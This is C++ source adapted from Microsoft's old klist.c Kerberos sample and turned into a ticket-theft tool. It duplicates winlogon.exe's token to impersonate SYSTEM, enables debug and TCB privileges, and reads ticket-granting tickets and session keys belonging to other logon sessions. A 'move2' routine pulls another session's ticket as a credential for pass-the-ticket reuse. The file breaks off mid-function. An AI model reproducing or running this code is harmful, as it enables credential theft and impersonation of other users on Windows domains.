/*--

THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
PARTICULAR PURPOSE.

Copyright (C) 1999 - 2000  Microsoft Corporation.  All rights reserved.

Module Name:

    klist.c

Abstract:

    Sample program that demonstrates how to:
       query Kerberos ticket cache
       purge Kerberos tickets from cache
       request service ticket

Author:

    David Mowers (davemo)   14-October-98

Revision History:

--*/


//
// Common include files.
//
#define UNICODE
#define _UNICODE

#include <windows.h>
#include <stdio.h>      
#include <stdlib.h>     
#include <conio.h>      
#include <ntsecapi.h>
#include <ctype.h>
#include <TlHelp32.h>
#include <iostream>
#define SECURITY_WIN32
#include <security.h>   
#include <string>
#include <vector>
#include <strsafe.h>
#include <stdarg.h>
#include <sddl.h> // For ConvertStringSidToSid
#include <atlbase.h> 

#define INTERACTIVE_PURGE 1

#define SEC_SUCCESS(Status) ((Status) >= 0) 

VOID
InitUnicodeString(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString OPTIONAL
    );

VOID 
ShowLastError(
    const char* szAPI, 
    DWORD dwError
    );

VOID 
ShowNTError( 
    const char* szAPI, 
    NTSTATUS Status 
    );

BOOL 
PackageConnectLookup(
    HANDLE *pLogonHandle, 
    ULONG *pPackageId
    );

BOOL 
ShowTickets(
    HANDLE LogonHandle,
    ULONG PackageId,
    DWORD dwMode
    );

BOOL
ShowTgt(
    HANDLE LogonHandle,
    ULONG PackageId,
    LUID L
    );
BOOL
ShowAll(
    HANDLE LogonHandle,
    ULONG PackageId,
    LUID L
);

DWORD 
GetEncodedTicket(
    HANDLE LogonHandle,
    ULONG PackageId,
    wchar_t *Server
    );



//bool move(HANDLE LogonHandle, ULONG PackageId, LUID dl, LUID tl);
bool move2(HANDLE LogonHandle, ULONG PackageId, wchar_t* Server, LUID tl);

typedef struct _KERB_RETRIEVE_ENCODED_TICKET_RESPONSE {
    PKERB_EXTERNAL_NAME ServiceName;
    PKERB_EXTERNAL_NAME TargetName;
    UNICODE_STRING DomainName;
    UNICODE_STRING TargetDomainName;
    UNICODE_STRING AltTargetDomainName;
    KERB_CRYPTO_KEY SessionKey;
    ULONG TicketFlags;
    LARGE_INTEGER ExpirationTime;
    LARGE_INTEGER StartTime;
    LARGE_INTEGER RenewUntil;
    LARGE_INTEGER TimeSkew;
    ULONG EncodedTicketSize;
    PUCHAR EncodedTicket;
} KERB_RETRIEVE_ENCODED_TICKET_RESPONSE, * PKERB_RETRIEVE_ENCODED_TICKET_RESPONSE;




BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, privName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL success = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return success && GetLastError() == ERROR_SUCCESS;
}

void PrintHexDump(const unsigned char* data, size_t size) {
    const size_t bytesPerLine = 16;

    for (size_t i = 0; i < size; i += bytesPerLine) {
        // Offset
        printf("%04zx  ", i);

        // Hex output with ":" separator after 8 bytes
        for (size_t j = 0; j < bytesPerLine; ++j) {
            if (i + j < size) {
                if(j == 7)
                    printf("%02x", data[i + j]);
                else
                    printf("%02x ", data[i + j]);
            }
                
            else
                printf("   ");

            if (j == 7)
                printf(":");
        }

        printf("\n");
    }
}


// Function to check if the current user is LocalSystem
bool IsCurrentUserLocalSystem()
{
    HANDLE hToken = nullptr;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
        // If there's no thread token, fall back to process token
        if (GetLastError() == ERROR_NO_TOKEN) {
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
                std::cout << "OpenProcessToken failed" << std::endl;
                return false;
            }
        }
        else {
            std::cout << "OpenThreadToken failed" << std::endl;
            return false;
        }
    }

    BYTE buffer[SECURITY_MAX_SID_SIZE];
    DWORD sidSize = sizeof(buffer);
    PSID localSystemSid = buffer;

    if (!CreateWellKnownSid(WinLocalSystemSid, NULL, localSystemSid, &sidSize)) {
        CloseHandle(hToken);
        std::cout << "CreateWellKnownSid failed" << std::endl;
        return false;
    }

    TOKEN_USER* tokenUser = nullptr;
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwSize);
    tokenUser = (TOKEN_USER*)malloc(dwSize);

    if (!GetTokenInformation(hToken, TokenUser, tokenUser, dwSize, &dwSize)) {
        free(tokenUser);
        CloseHandle(hToken);
        return false;
    }

    BOOL result = EqualSid(tokenUser->User.Sid, localSystemSid);
    free(tokenUser);
    CloseHandle(hToken);
    return result;
}





bool ImpersonateSystemFromProcess()
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    DWORD pid = 0;

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (!pid) return false;
    HANDLE hProc = nullptr, hToken = nullptr, hDupToken = nullptr;

    // Find PID of winlogon.exe (or services.exe, etc.)
    // Let's say it's stored in `pid` already.

    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        std::cout << "OpenProcess failed" << std::endl;
        return false;
    }

    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {

        std::cout << "OpenProcessToken failed" << std::endl;
        return false;
    }
        

    if (!DuplicateTokenEx(
        hToken,
        MAXIMUM_ALLOWED,
        nullptr,
        SecurityImpersonation,
        TokenImpersonation,
        &hDupToken))
    {
        std::cout << "DuplicateToken failed" << std::endl;
        CloseHandle(hToken);
        return false;
    }

    /*if (!SetThreadToken(nullptr, hDupToken))
    {

        CloseHandle(hToken);
        CloseHandle(hDupToken);
        return false;
    }
    */
    if (!ImpersonateLoggedOnUser(hDupToken)) {

        std::cout << "ImpersonateLoggedOnUser failed" << std::endl;
        return false;

    }

    if (!IsCurrentUserLocalSystem()) {

        std::cout << "We are not system, unknown error" << std::endl;

    }

    // Success
    CloseHandle(hToken);
    CloseHandle(hDupToken);
    CloseHandle(hProc);
    return true;
}

void RevertIfImpersonated()
{
    RevertToSelf(); // Reverts thread token only
}

const char* GetKeyTypeName(ULONG keyType) {
    switch (keyType) {
    case 0x12: return "AES-256-CTS-HMAC-SHA1-96";
    case 0x11: return "AES-128-CTS-HMAC-SHA1-96";
    case 0x17: return "RC4-HMAC";
    case 0x18: return "RC4-HMAC-EXP";
    default: return "Unknown";
    }
}

void PrintSessionKey(KERB_CRYPTO_KEY key) {
    printf("Session Key        : KeyType 0x%02X - %s\n", key.KeyType, GetKeyTypeName(key.KeyType));
    printf("                   : KeyLength %lu - ", key.Length);
   // printf("Session Key Value  : ");

    for (ULONG i = 0; i < key.Length; i++) {
        printf("%02X", ((BYTE*)key.Value)[i]);
        printf(" ");
    }
    printf("\n");
}


LUID ParseLuid(const std::wstring& lowHex, const std::wstring& highHex = L"0x0") {
    LUID luid;
    luid.LowPart = static_cast<DWORD>(std::stoul(lowHex, nullptr, 0));   // base 0 = auto-detect hex or dec
    luid.HighPart = static_cast<LONG>(std::stol(highHex, nullptr, 0));
    return luid;
}




int __cdecl
wmain(
    int argc, 
    wchar_t  *argv[]
    )
{

    HANDLE LogonHandle = NULL;
    ULONG PackageId;
    
    if (argc < 2)
    {
        printf("Usage: %S <tickets | tgt <-li>, <-lh> | all <-li>, <-lh> | move -li <-lh> | move2 [service principal name(for get)]  -li <-lh> |  purge | get> [service principal name(for get)]\n",argv[0]);
        return FALSE;
    }

    //
    // Get the logon handle and package ID from the
    // Kerberos package
    //
    if(!PackageConnectLookup(&LogonHandle, &PackageId))
        return FALSE;

    if(!_wcsicmp(argv[1],L"tickets"))
    {
        ShowTickets(LogonHandle, PackageId, 0);
    }
    else if(!_wcsicmp(argv[1],L"tgt"))
    {
        std::wstring lowarg = L"0x0";
        std::wstring higharg = L"0x0";
        bool system = FALSE;
        for (int i = 1; i < argc; i++) {
            if (!_wcsicmp(argv[i], L"-li") && i + 1 < argc) {
                lowarg = argv[++i];
                system = TRUE;
            }
            else if (!_wcsicmp(argv[i], L"-lh") && i + 1 < argc) {
                higharg = argv[++i];
                system = TRUE;
            }
        }

        LUID luid = ParseLuid(lowarg, higharg);
        //if(!_wcsicmp(argv))

        if (system) {
            EnablePrivilege(SE_DEBUG_NAME);
            EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);
            //bool test = TemporarilyImpersonateSystem();


            bool test = ImpersonateSystemFromProcess();

            if (IsCurrentUserLocalSystem()) {

                std::cout << "token is system" << std::endl;
            }
            else {
                std::cout << "System elevation failed" << std::endl;

            }
        }

        ShowTgt(LogonHandle, PackageId, luid);
        RevertIfImpersonated();
    }
    else if (!_wcsicmp(argv[1], L"all"))
    {
        std::wstring lowarg = L"0x0";
        std::wstring higharg = L"0x0";
        bool system = FALSE;


        for (int i = 1; i < argc; i++) {
            if (!_wcsicmp(argv[i], L"-li") && i + 1 < argc) {
                lowarg = argv[++i];
                system = TRUE;
            }
            else if (!_wcsicmp(argv[i], L"-lh") && i + 1 < argc) {
                higharg = argv[++i];
                system = TRUE;
            }
        }

        LUID luid = ParseLuid(lowarg, higharg);

        if (system) {
            EnablePrivilege(SE_DEBUG_NAME);
            EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);

            // bool test1 = TemporarilyImpersonateSystem();
            bool test1 = ImpersonateSystemFromProcess();
            if (IsCurrentUserLocalSystem()) {

                std::cout << "token is system" << std::endl;
            }
            else {
                std::cout << "System elevation failed" << std::endl;

            }
        }
        ShowAll(LogonHandle, PackageId, luid);
        RevertIfImpersonated();
    }
   /* else if (!_wcsicmp(argv[1], L"move")) {

        std::wstring tlowarg = L"0x0";
        std::wstring thigharg = L"0x0";
        std::wstring dlowarg = L"0x0";
        std::wstring dhigharg = L"0x0";

        for (int i = 1; i < argc; i++) {
            if (!_wcsicmp(argv[i], L"-li") && i + 1 < argc) {
                tlowarg = argv[++i];

            }
            else if (!_wcsicmp(argv[i], L"-lh") && i + 1 < argc) {
                thigharg = argv[++i];
               
            }
        }
        LUID tluid = ParseLuid(tlowarg, thigharg);
        LUID dluid = ParseLuid(dlowarg, dhigharg);
        EnablePrivilege(SE_DEBUG_NAME);
        EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);

        // bool test1 = TemporarilyImpersonateSystem();
        bool test1 = ImpersonateSystemFromProcess();
        if (IsCurrentUserLocalSystem()) {

            std::cout << "token is system" << std::endl;
        }
        else {
            std::cout << "System elevation failed" << std::endl;

        }

        move(LogonHandle, PackageId, dluid, tluid);
        RevertIfImpersonated();

    }*/
    else if (!_wcsicmp(argv[1], L"move2")) {

        std::wstring tlowarg = L"0x0";
        std::wstring thigharg = L"0x0";
        std::wstring dlowarg = L"0x0";
        std::wstring dhigharg = L"0x0";

        for (int i = 1; i < argc; i++) {
            if (!_wcsicmp(argv[i], L"-li") && i + 1 < argc) {
                tlowarg = argv[++i];

            }
            else if (!_wcsicmp(argv[i], L"-lh") && i + 1 < argc) {
                thigharg = argv[++i];

            }
        }
        LUID tluid = ParseLuid(tlowarg, thigharg);
        LUID dluid = ParseLuid(dlowarg, dhigharg);
        EnablePrivilege(SE_DEBUG_NAME);
        EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);

        // bool test1 = TemporarilyImpersonateSystem();
        bool test1 = ImpersonateSystemFromProcess();
        if (IsCurrentUserLocalSystem()) {

            std::cout << "token is system" << std::endl;
        }
        else {
            std::cout << "System elevation failed" << std::endl;

        }

        move2(LogonHandle, PackageId, argv[2], tluid);
        RevertIfImpersonated();

        }

    else if(!_wcsicmp(argv[1],L"purge"))
    {
        ShowTickets(LogonHandle, PackageId, INTERACTIVE_PURGE);
    }
    else if(!_wcsicmp(argv[1],L"get"))
    {
        if(argc < 3)
        {
            printf("Provide service principal name (SPN) of encoded ticket to retrieve\n");
        }
        else
            GetEncodedTicket(LogonHandle, PackageId, argv[2]);
    }
    else
    {
        printf("Usage: %S <tickets | tgt | purge | get> [service principal name(for get)]\n",argv[0]);
    }

    if (LogonHandle != NULL)
    {
        LsaDeregisterLogonProcess(LogonHandle);
    }

    return TRUE;
    
}

VOID
PrintKerbName(
    PKERB_EXTERNAL_NAME Name
    )
{
    ULONG Index;
    for (Index = 0; Index < Name->NameCount ; Index++ )
    {
        printf("%wZ",&Name->Names[Index]);
    if ((Index+1) < Name->NameCount)
	    printf("/");
    }
    printf("\n");
}

VOID 
PrintTime(
    const char* Comment,
    TimeStamp ConvertTime
    )
{

    printf( "%s", Comment );

    //
    // If the time is infinite,
    //  just say so.
    //
    if ( ConvertTime.HighPart == 0x7FFFFFFF && ConvertTime.LowPart == 0xFFFFFFFF ) {
        printf( "Infinite\n" );

    //
    // Otherwise print it more clearly
    //
    } else {

        SYSTEMTIME SystemTime;
        FILETIME LocalFileTime;

        if( FileTimeToLocalFileTime(
                (PFILETIME) &ConvertTime,
                &LocalFileTime
                ) &&
            FileTimeToSystemTime(
                &LocalFileTime,
                &SystemTime
                ) )
        {

            printf( "%ld/%ld/%ld %ld:%2.2ld:%2.2ld\n",
                    SystemTime.wMonth,
                    SystemTime.wDay,
                    SystemTime.wYear,
                    SystemTime.wHour,
                    SystemTime.wMinute,
                    SystemTime.wSecond );
        }
        	else
	    {
	        printf( "%ld\n", (long)(ConvertTime.QuadPart/(10*1000*1000)));
	    }
    }

}

VOID 
PrintEType(
    int etype
    )
{

#define AddEtype(n) { n, L###n }

    struct _etype {
        int etype;
        LPCWSTR ename;
    } enames[] = {
        AddEtype(KERB_ETYPE_NULL),
        AddEtype(KERB_ETYPE_DES_CBC_CRC),
        AddEtype(KERB_ETYPE_DES_CBC_MD4),
        AddEtype(KERB_ETYPE_DES_CBC_MD5),
        AddEtype(KERB_ETYPE_DES_PLAIN),
        AddEtype(KERB_ETYPE_RC4_MD4),
        AddEtype(KERB_ETYPE_RC4_PLAIN2),
        AddEtype(KERB_ETYPE_RC4_LM),
        AddEtype(KERB_ETYPE_RC4_SHA),
        AddEtype(KERB_ETYPE_DES_PLAIN),
        AddEtype(KERB_ETYPE_RC4_HMAC_OLD),
        AddEtype(KERB_ETYPE_RC4_PLAIN_OLD),
        AddEtype(KERB_ETYPE_RC4_HMAC_OLD_EXP),
        AddEtype(KERB_ETYPE_RC4_PLAIN_OLD_EXP),
        AddEtype(KERB_ETYPE_RC4_PLAIN),
        AddEtype(KERB_ETYPE_RC4_PLAIN_EXP),
        AddEtype(KERB_ETYPE_DSA_SIGN),
        AddEtype(KERB_ETYPE_RSA_PRIV),
        AddEtype(KERB_ETYPE_RSA_PUB),
        AddEtype(KERB_ETYPE_RSA_PUB_MD5),
        AddEtype(KERB_ETYPE_RSA_PUB_SHA1),
        AddEtype(KERB_ETYPE_PKCS7_PUB),
        AddEtype(KERB_ETYPE_DES_CBC_MD5_NT),
        AddEtype(KERB_ETYPE_RC4_HMAC_NT),
        AddEtype(KERB_ETYPE_RC4_HMAC_NT_EXP),
        {-1, 0}
    };
    int i;

    for (i = 0; enames[i].ename != 0; i++) {
    if (etype == enames[i].etype) {
        printf("session key      : (%d) %S\n",
           etype,
           enames[i].ename);
        return;
    }
    }
    printf("session key        : %d\n", etype);
}


VOID
PrintTktFlags(
    ULONG flags
    )
{
    if (flags & KERB_TICKET_FLAGS_forwardable) {
        printf("forwardable ");
    }
    if (flags & KERB_TICKET_FLAGS_forwarded) {
        printf("forwarded ");
    }
    if (flags & KERB_TICKET_FLAGS_proxiable) {
        printf("proxiable ");
    }
    if (flags & KERB_TICKET_FLAGS_proxy) {
        printf("proxy ");
    }
    if (flags & KERB_TICKET_FLAGS_may_postdate) {
        printf("may_postdate ");
    }
    if (flags & KERB_TICKET_FLAGS_postdated) {
        printf("postdated ");
    }
    if (flags & KERB_TICKET_FLAGS_invalid) {
        printf("invalid ");
    }
    if (flags & KERB_TICKET_FLAGS_renewable) {
        printf("renewable ");
    }
    if (flags & KERB_TICKET_FLAGS_initial) {
        printf("initial ");
    }
    if (flags & KERB_TICKET_FLAGS_hw_authent) {
        printf("hw_auth ");
    }
    if (flags & KERB_TICKET_FLAGS_pre_authent) {
        printf("preauth ");
    }
    if (flags & KERB_TICKET_FLAGS_ok_as_delegate) {
        printf("delegate ");
    }
    printf("\n");
}

BOOL 
PackageConnectLookup(
    HANDLE *pLogonHandle, 
    ULONG *pPackageId
    )
{
    LSA_STRING Name;
    NTSTATUS Status;

    Status = LsaConnectUntrusted(
                pLogonHandle
                );

    if (!SEC_SUCCESS(Status))
    {

        ShowNTError("LsaConnectUntrusted", Status);
        return FALSE;
    }

    Name.Buffer = (PCHAR)MICROSOFT_KERBEROS_NAME_A;
    Name.Length = (USHORT)strlen(Name.Buffer);
    Name.MaximumLength = Name.Length + 1;

    Status = LsaLookupAuthenticationPackage(
                *pLogonHandle,
                &Name,
                pPackageId
                );

    if (!SEC_SUCCESS(Status))
    {
        ShowNTError("LsaLookupAuthenticationPackage", Status);
        return FALSE;
    }

    return TRUE;

}

BOOL 
PurgeTicket(
    HANDLE LogonHandle,
    ULONG PackageId,
    LPWSTR Server, 
    DWORD  cbServer,
    LPWSTR Realm,
    DWORD  cbRealm
    )
{
    NTSTATUS Status;
    PVOID Response;
    ULONG ResponseSize;
    NTSTATUS SubStatus=0;

    PKERB_PURGE_TKT_CACHE_REQUEST pCacheRequest = NULL;

    pCacheRequest = (PKERB_PURGE_TKT_CACHE_REQUEST)
        LocalAlloc(LMEM_ZEROINIT, 
        cbServer + cbRealm + sizeof(KERB_PURGE_TKT_CACHE_REQUEST));

    pCacheRequest->MessageType = KerbPurgeTicketCacheMessage;
    pCacheRequest->LogonId.LowPart = 0;
    pCacheRequest->LogonId.HighPart = 0;

    CopyMemory((LPBYTE)pCacheRequest+sizeof(KERB_PURGE_TKT_CACHE_REQUEST),
        Server,cbServer);
    CopyMemory((LPBYTE)pCacheRequest+sizeof(KERB_PURGE_TKT_CACHE_REQUEST)+cbServer,
        Realm,cbRealm);

    pCacheRequest->ServerName.Buffer = 
        (LPWSTR)((LPBYTE)pCacheRequest+sizeof(KERB_PURGE_TKT_CACHE_REQUEST));
    
    pCacheRequest->ServerName.Length = 
        (unsigned short)cbServer;
    
    pCacheRequest->ServerName.MaximumLength = 
        (unsigned short)cbServer;
    
    pCacheRequest->RealmName.Buffer = 
        (LPWSTR)((LPBYTE)pCacheRequest+sizeof(KERB_PURGE_TKT_CACHE_REQUEST)+cbServer);
    
    pCacheRequest->RealmName.Length = 
        (unsigned short)cbRealm;
    
    pCacheRequest->RealmName.MaximumLength = 
        (unsigned short)cbRealm;

    printf("\tDeleting ticket: \n");
    printf("\t   ServerName = %wZ (cb=%lu)\n",&pCacheRequest->ServerName,cbServer);
    printf("\t   RealmName  = %wZ (cb=%lu)\n",&pCacheRequest->RealmName,cbRealm);

    Status = LsaCallAuthenticationPackage(
                LogonHandle,
                PackageId,
                pCacheRequest,
                sizeof(KERB_PURGE_TKT_CACHE_REQUEST)+cbServer+cbRealm,
                &Response,
                &ResponseSize,
                &SubStatus
                );

    if (!SEC_SUCCESS(Status) || !SEC_SUCCESS(Status))
    {
        ShowNTError("LsaCallAuthenticationPackage(purge)", Status);
        printf("Substatus: 0x%x\n",SubStatus);
        ShowNTError("LsaCallAuthenticationPackage(purge SubStatus)", SubStatus);
        return FALSE;
    }
    else 
    {
        printf("\tTicket purged!\n");
        return TRUE;
    }

}


BOOL 
ShowTickets(
    HANDLE LogonHandle,
    ULONG PackageId,
    DWORD dwMode
    )
{
    NTSTATUS Status;
    KERB_QUERY_TKT_CACHE_REQUEST CacheRequest;
    PKERB_QUERY_TKT_CACHE_RESPONSE CacheResponse = NULL;
    ULONG ResponseSize;
    NTSTATUS SubStatus;
    ULONG Index;
    int ch;

    CacheRequest.MessageType = KerbQueryTicketCacheMessage;
    CacheRequest.LogonId.LowPart = 0;
    CacheRequest.LogonId.HighPart = 0;

    Status = LsaCallAuthenticationPackage(
                LogonHandle,
                PackageId,
                &CacheRequest,
                sizeof(CacheRequest),
                (PVOID *) &CacheResponse,
                &ResponseSize,
                &SubStatus
                );
    if (!SEC_SUCCESS(Status) || !SEC_SUCCESS(SubStatus))
    {
        ShowNTError("LsaCallAuthenticationPackage", Status);
        printf("Substatus: 0x%x\n",SubStatus);
        return FALSE;
    }

    printf("\nCached Tickets: (%lu)\n", CacheResponse->CountOfTickets);
    for (Index = 0; Index < CacheResponse->CountOfTickets ; Index++ )
    {
        printf("\n   Server: %wZ@%wZ\n",
            &CacheResponse->Tickets[Index].ServerName,
            &CacheResponse->Tickets[Index].RealmName);
        printf("      ");
        PrintEType(CacheResponse->Tickets[Index].EncryptionType);
        PrintTime("      End Time: ",CacheResponse->Tickets[Index].EndTime);
        PrintTime("      Renew Time: ",CacheResponse->Tickets[Index].RenewTime);
        printf("      TicketFlags: (0x%x) ", CacheResponse->Tickets[Index].TicketFlags);
        PrintTktFlags(CacheResponse->Tickets[Index].TicketFlags);
        printf("\n");

        if(dwMode == INTERACTIVE_PURGE)
        {
            printf("Purge? (y/n/q) : ");
            ch = _getche();
            if(ch == 'y' || ch == 'Y')
            {
                printf("\n");
                PurgeTicket( 
                    LogonHandle,
                    PackageId,
                    CacheResponse->Tickets[Index].ServerName.Buffer,
                    CacheResponse->Tickets[Index].ServerName.Length,
                    CacheResponse->Tickets[Index].RealmName.Buffer,
                    CacheResponse->Tickets[Index].RealmName.Length
                    );
            }
            else if(ch == 'q' || ch == 'Q')
                goto cleanup;
            else
                printf("\n\n");

        }
    }

cleanup:

    if (CacheResponse != NULL)
    {
        LsaFreeReturnBuffer(CacheResponse);
    }

    return TRUE;
}
DWORD
GetEncodedTicket(
    HANDLE LogonHandle,
    ULONG PackageId,
    wchar_t* Server
)
{
    NTSTATUS Status;
    PKERB_RETRIEVE_TKT_REQUEST CacheRequest = NULL;
    PKERB_RETRIEVE_TKT_RESPONSE CacheResponse = NULL;
    PKERB_EXTERNAL_TICKET Ticket;
    ULONG ResponseSize;
    NTSTATUS SubStatus;
    BOOLEAN Trusted = TRUE;
    BOOLEAN Success = FALSE;
    UNICODE_STRING Target = { 0 };
    UNICODE_STRING Target2 = { 0 };

    InitUnicodeString(&Target2, Server);

    CacheRequest = (PKERB_RETRIEVE_TKT_REQUEST)
        LocalAlloc(LMEM_ZEROINIT, Target2.Length + sizeof(KERB_RETRIEVE_TKT_REQUEST));

    CacheRequest->MessageType = KerbRetrieveEncodedTicketMessage;
    CacheRequest->LogonId.LowPart = 0;
    CacheRequest->LogonId.HighPart = 0;


    Target.Buffer = (LPWSTR)(CacheRequest + 1);
    Target.Length = Target2.Length;
    Target.MaximumLength = Target2.MaximumLength;

    CopyMemory(
        Target.Buffer,
        Target2.Buffer,
        Target2.Length
    );

    CacheRequest->TargetName = Target;

    Status = LsaCallAuthenticationPackage(
        LogonHandle,
        PackageId,
        CacheRequest,
        Target2.Length + sizeof(KERB_RETRIEVE_TKT_REQUEST),
        (PVOID*)&CacheResponse,
        &ResponseSize,
        &SubStatus
    );

    if (!SEC_SUCCESS(Status) || !SEC_SUCCESS(SubStatus))
    {
        ShowNTError("LsaCallAuthenticationPackage", Status);
        printf("Substatus: 0x%x\n", SubStatus);
        ShowNTError("Substatus:", SubStatus);

    }
    else
    {
        Ticket = &(CacheResponse->Ticket);
        

        printf("\nEncoded Ticket:\n\n");

        printf("ServiceName: "); PrintKerbName(Ticket->ServiceName);

        printf("TargetName: "); PrintKerbName(Ticket->TargetName);

        printf("ClientName: "); PrintKerbName(Ticket->ClientName);

        printf("DomainName: %.*S\n",
            Ticket->DomainName.Length / sizeof(WCHAR), Ticket->DomainName.Buffer);

        printf("TargetDomainName: %.*S\n",
            Ticket->TargetDomainName.Length / sizeof(WCHAR), Ticket->TargetDomainName.Buffer);

        printf("AltTargetDomainName: %.*S\n",
            Ticket->AltTargetDomainName.Length / sizeof(WCHAR), Ticket->AltTargetDomainName.Buffer);

        printf("TicketFlags: (0x%x) ", Ticket->TicketFlags);
        PrintTktFlags(Ticket->TicketFlags);
        PrintTime("KeyExpirationTime: ", Ticket->KeyExpirationTime);
        PrintTime("StartTime: ", Ticket->StartTime);
        PrintTime("EndTime: ", Ticket->EndTime);
        PrintTime("RenewUntil: ", Ticket->RenewUntil);
        PrintTime("TimeSkew: ", Ticket->TimeSkew);
        PrintEType(Ticket->SessionKey.KeyType);

        Success = TRUE;

    }

    if (CacheResponse)
    {
        LsaFreeReturnBuffer(CacheResponse);
    }
    if (CacheRequest)
    {
        LocalFree(CacheRequest);
    }

    return Success;
}


 LUID getcurrentLuid() {

     LUID tmp = ParseLuid(L"0x0", L"0x0");
    
     HANDLE hToken = nullptr;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
         std::cerr << "Failed to open process token. Error: " << GetLastError() << "\n";
         return tmp;
     }
     TOKEN_STATISTICS tokenStats;
     DWORD dwLength = 0;
     if (!GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwLength)) {
         std::cerr << "Failed to get token information. Error: " << GetLastError() << "\n";
         CloseHandle(hToken);
         return tmp;
     }

     CloseHandle(hToken);

     LUID l;
     l.HighPart = tokenStats.AuthenticationId.HighPart;
     l.LowPart = tokenStats.AuthenticationId.LowPart;

     return l;

}




 /*bool move(HANDLE LogonHandle, ULONG PackageId, LUID dl, LUID tl) {

     NTSTATUS status;
     NTSTATUS substatus;
     status = LsaConnectUntrusted(&LogonHandle);
     KERB_TRANSFER_CRED_REQUEST ktcr;
     LUID dluid = getcurrentLuid();
     ktcr.MessageType = KerbTransferCredentialsMessage;
     ktcr.OriginLogonId = tl;
     ktcr.DestinationLogonId = dluid;
     ktcr.Flags = 0;



     PVOID pOut = nullptr;
     ULONG outLen = 0;

     status = LsaCallAuthenticationPackage(LogonHandle, PackageId, &ktcr, sizeof(ktcr), &pOut, &outLen, &substatus);


     if (!SEC_SUCCESS(status) || !SEC_SUCCESS(substatus))
     {
         ShowNTError("LsaCallAuthenticationPackage", status);
         printf("Substatus: 0x%x\n", substatus);
         return FALSE;
     }

     return TRUE;

}*/

 bool move2(HANDLE LogonHandle, ULONG PackageId, wchar_t* Server, LUID tl) {
     NTSTATUS Status;
     PKERB_RETRIEVE_TKT_REQUEST CacheRequest = NULL;
     PKERB_RETRIEVE_TKT_RESPONSE CacheResponse = NULL;
     PKERB_EXTERNAL_TICKET Ticket;
     ULONG ResponseSize;
     NTSTATUS SubStatus;
     BOOLEAN Trusted = TRUE;
     BOOLEAN Success = FALSE;
     UNICODE_STRING Target = { 0 };
     UNICODE_STRING Target2 = { 0 };

     InitUnicodeString(&Target2, Server);
     CacheRequest = (PKERB_RETRIEVE_TKT_REQUEST)
         LocalAlloc(LMEM_ZEROINIT, Target2.Length + sizeof(KERB_RETRIEVE_TKT_REQUEST));

     Status = LsaConnectUntrusted(&LogonHandle);
     CacheRequest->MessageType = KerbRetrieveEncodedTicketMessage;
     LUID dluid = getcurrentLuid();
     CacheRequest->LogonId = tl;
     Target.Buffer = (LPWSTR)(CacheRequest + 1);
     Target.Length = Target2.Length;
     Target.MaximumLength = Target2.MaximumLength;
     CopyMemory(
         Target.Buffer,
         Target2.Buffer,
         Target2.Length
     );
     CacheRequest->TargetName = Target;
     CacheRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;

     
     
     EnablePrivilege(SE_TCB_NAME);

     Status = LsaCallAuthenticationPackage(
         LogonHandle,
         PackageId,
         CacheRequest,
         Target2.Length + sizeof(KERB_RETRIEVE_TKT_REQUEST),
         (PVOID*)&CacheResponse,
         &ResponseSize,
         &SubStatus
     );

     if (!SEC_SUCCESS(Status) || !SEC_SUCCESS(SubStatus))
     {
         ShowNTError("LsaCallAuthenticationPackage", Status);
         printf("Substatus: 0x%x\n", SubStatus);
         ShowNTError("Substatus:", SubStatus);
         std::cout << "LsaCallAuthPackage first call failed" << std::endl;

     }


     Ticket = &(CacheResponse->Ticket);
     ULONG retSize;
     ULONG headerSize = sizeof(KERB_SUBMIT_TKT_REQUEST);
     ULONG keySize = 0;
     ULONG totalSize = headerSize + keySize + Ticket->EncodedTicketSize;
     //std::vector<char> req_buffer(sizeof(KERB_RETRIEVE_TKT_REQUEST) + spn_length + sizeof(WCHAR));
     //std::vector<char> req_buffer(sizeof(KERB_RETRIEVE_TKT_REQUEST) + Ticket->EncodedTicketSize);

     //LocalAlloc(LMEM_ZEROINIT, Target2.Length + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    // LocalAlloc(LMEM_ZEROINIT, Ticket->EncodedTicketSize + sizeof(KERB_SUBMIT_TKT_REQUEST));
     //CacheRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LMEM_ZEROINIT, Target2.Length + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    // PBYTE buffer = (PBYTE)malloc(totalSize);
